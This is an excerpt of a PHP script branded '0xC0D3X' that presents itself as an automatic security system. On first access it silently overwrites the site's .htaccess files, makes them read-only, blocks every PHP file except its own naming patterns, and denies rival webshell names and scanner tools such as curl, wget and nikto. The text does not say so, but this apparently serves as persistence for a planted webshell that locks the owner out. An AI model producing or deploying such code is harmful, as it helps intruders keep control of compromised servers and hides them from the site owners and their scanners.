...
/**
 * Install .htaccess protection automatically when script runs
 * This runs immediately when script is accessed for the first time
 */
function installAutomaticHtaccessProtection() {
    global $current_script;
    $root_dir = dirname(__FILE__);
    $protection_file = $root_dir . '/.0xc0d3x_protection_installed';
    
    // Check if protection is already installed (avoid repeated installations)
    if (file_exists($protection_file)) {
        return true;
    }
    
    // Enhanced .htaccess content with maximum security
    $htaccess_content = <<<HTACCESS
# ============= 0xC0D3X AUTOMATIC PROTECTION =============
# Auto-installed by 0xC0D3X Security System
...
<FilesMatch "\.(htaccess|htpasswd|ini|log|sh|bak|sql|tar|gz|zip|rar|exe|bat|cmd|dll|so|py|pl|rb|jar|war|ear|msi|vbs|scr|pif|reg|js|jsp|asp|aspx|cgi|cfm|swf|xml)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Block common webshell/backdoor names (case insensitive)
<FilesMatch "(?i)(wso|shell|backdoor|c99|r57|b374k|uploader|cmd|hack|exploit|malware|virus|trojan|webshell|cgishell|phpshell|kontrol|adminer|mini|filemanager|connector|phpmyadmin)\.(php|phtml|phps|php[0-9]+|inc)$">
    Order allow,deny
    Deny from all
</FilesMatch>
...
<IfModule mod_rewrite.c>
    ...
    # Block direct access to these directories
    RewriteRule ^(uploads|images|files|tmp|cache|temp|log)/.*\.(php|phtml|phps|php[0-9]+|inc|pl|cgi|py|rb)$ - [F,NC,L]
    
    # Allow only specific 0xC0D3X files
    RewriteCond %{REQUEST_URI} !(0xc0d3x\.php|index\.php)$ [NC]
    RewriteCond %{REQUEST_URI} !(0xc0d3x_[a-z0-9_\-]+\.php)$ [NC]
    RewriteCond %{REQUEST_URI} !(codex_[a-z0-9_\-]+\.php)$ [NC]
    RewriteCond %{REQUEST_URI} !(squad_[a-z0-9_\-]+\.php)$ [NC]
    RewriteCond %{REQUEST_URI} !(config_[a-z0-9_\-]+\.php)$ [NC]
    RewriteCond %{REQUEST_URI} !(settings_[a-z0-9_\-]+\.php)$ [NC]
    
    # Block all other PHP files
    RewriteRule \.(php|phtml|phps|php[0-9]+|inc)$ - [F,NC,L]
    
    # Block suspicious user agents
    RewriteCond %{HTTP_USER_AGENT} (libwww-perl|wget|curl|python|nikto|wicket|grabber|scan|dirbuster) [NC]
    RewriteRule .* - [F,L]
</IfModule>

# Force all PHP files to be processed by 0xC0D3X protection
<FilesMatch "\.(php|phtml|phps|php[0-9]+|inc)$">
    # Only if auto_prepend_file is available
    <IfModule mod_php.c>
...
<DirectoryMatch "(\.git|\.svn|\.hg|CVS|vendor|node_modules)">
    Order allow,deny
    Deny from all
</DirectoryMatch>
...
HTACCESS;
    ...
    $installed = @file_put_contents($root_dir . '/.htaccess', $htaccess_content);
    
    if ($installed) {
        @chmod($root_dir . '/.htaccess', 0444);
        
        // Also install in common subdirectories
        $common_dirs = [
            $root_dir . '/uploads',
            $root_dir . '/images',
            $root_dir . '/files',
        ...
        @file_put_contents($protection_file, '0xC0D3X Protection Installed: ' . date('Y-m-d H:i:s'));
        @chmod($protection_file, 0444);
...
// Run AUTOMATIC .htaccess installation IMMEDIATELY
$auto_htaccess_installed = installAutomaticHtaccessProtection();
...
<body>
    ...
    <div class="neumorphic-container">
        ...
        <!-- Auto-protection status message -->
        <?php if ($auto_htaccess_installed): ?>
            <div class="alert alert-success" style="margin-bottom: 15px;">
                ✓ AUTOMATIC HTACCESS PROTECTION INSTALLED
            </div>
        <?php endif; ?>
